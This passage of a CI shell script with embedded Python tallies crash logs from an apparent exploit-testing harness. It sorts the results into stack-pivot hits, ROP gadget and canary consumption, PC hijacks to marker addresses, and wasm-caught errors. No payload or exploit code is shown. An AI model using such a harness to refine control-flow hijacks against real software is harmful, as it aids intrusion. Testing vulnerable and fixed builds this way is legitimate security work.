    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-can-*.stderr")):
    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-mk-*.stderr")):
    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-dfp-*.stderr")):
    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-p*at-*.stderr")):
    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-mk24-*.stderr")):
    classify(f, None)
for f in sorted(glob.glob("ci-out/harness/nested-vuln-dfp24-*.stderr")):
    classify(f, None)

print("AIMED-PIVOT HITS (SIGILL):", len(aimed), aimed[:40])
print("GADGET-CONSUMED (PC/addr=0x4..):", len(gadget_consumed), gadget_consumed[:40])
print("CANARY-CONSUMED (labeled slot):", len(canary), canary[:120])
print("MARKER-HIJACKS (PC=0x41../0x42..):", len(marker), marker[:80])
print("holder-side crashes              :", len(holder), [f"{t}@0x{pc}" for t, pc in holder[:80]])
print("trigger-side crashes             :", len(trigger), trigger[:40])
print("holder-touched (hit attr)        :", len(hit), hit[:80])
print("holder-error (wasm-caught)       :", len(errd), [f"{t}:{e}" for t, e in errd[:40]])
print("clean completed                  :", len(clean))
from collections import Counter
print("holder PC tails                  :", Counter(pc[-3:] for _, pc in holder).most_common(12))
f = "ci-out/harness/nested-fixed-r256.json"
if os.path.exists(f) and os.path.getsize(f):
    d = json.load(open(f))
    e = (d.get("executes") or [{}])[0]
    print("fixed r256: error=%r response=%s" % (e.get("error"), bool(e.get("response"))))
PYEOF
else
  echo "wasmtime unavailable; skipping E6b"
fi

echo "=== summary ==="
cat ci-out/harness/fuzz_summary.json 2>/dev/null | head -120
ls -la ci-out/harness/ | head -30
exit 0
